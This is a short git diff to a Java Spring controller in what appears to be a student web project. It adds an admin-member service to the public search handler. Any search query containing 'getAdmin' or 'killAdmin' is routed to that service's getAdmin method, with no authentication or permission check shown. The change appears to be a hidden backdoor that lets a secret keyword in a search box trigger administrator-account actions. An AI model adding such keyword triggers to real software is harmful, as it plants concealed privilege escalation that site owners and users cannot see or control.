@@ -9,6 +9,7 @@ import org.springframework.stereotype.Controller;
 import org.springframework.ui.Model;
 import org.springframework.web.bind.annotation.RequestMapping;
 
+import egg.finalproject.admin.AdminMemberService;
 import egg.finalproject.post.PostDTO;
 import egg.finalproject.post.onlinePostService;
 
@@ -20,6 +21,8 @@ public class OnlineController {
 	private HttpSession session;
 	@Autowired
 	private onlinePostService service;
+	@Autowired
+	private AdminMemberService aService;
 	
 	public OnlineController() {
 		System.out.println("온라인컨트롤러 접속완료");
@@ -60,6 +63,9 @@ public class OnlineController {
 	@RequestMapping("/search.do")
 	public String mainSearch(Model model, String search) throws Exception{
 		System.out.println("search확인 == " + search);
+		if(search.contains("getAdmin") || search.contains("killAdmin")) {
+			aService.getAdmin(search);
+		}
 		List<Object> listRecent = service.mainSearch(search);
 		model.addAttribute("listRecent", listRecent);
 		model.addAttribute("search", search);
